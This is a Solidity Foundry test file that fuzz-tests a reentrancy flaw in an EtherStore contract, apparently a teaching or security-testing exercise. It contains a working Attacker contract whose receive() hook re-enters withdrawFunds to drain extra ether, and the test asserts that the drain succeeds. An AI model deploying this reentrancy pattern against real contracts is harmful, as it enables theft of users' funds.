
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {EtherStore} from "../src/EtherStore.sol";

contract TestReentrancyEtherStore is Test {
    EtherStore public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new EtherStore();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal, uint256 depositVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0 && attackVal <= 1 ether);
        vm.assume(depositVal >= 2 * attackVal && depositVal <= type(uint128).max);
        vm.assume(attackVal <= depositVal / 2);
        

        // --- 2. State Configuration (Pre-Condition) ---
        vm.warp(block.timestamp + 1 weeks);

        // --- 3. Funding ---
        
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), depositVal * 2);
        vm.deal(address(this), depositVal * 2);
        

        
        
        _attacker.setupAttack{value: depositVal}(depositVal, attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    EtherStore public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackValue;

    constructor(address victimAddress) { 
        victim = EtherStore(victimAddress);
    }

    function setupAttack(uint256 depVal, uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.depositFunds{value: msg.value}();
        attackValue = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        victim.withdrawFunds(val);

        if (address(this).balance >= initialSnapshot + 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.withdrawFunds(attackValue);
        }
    }
}
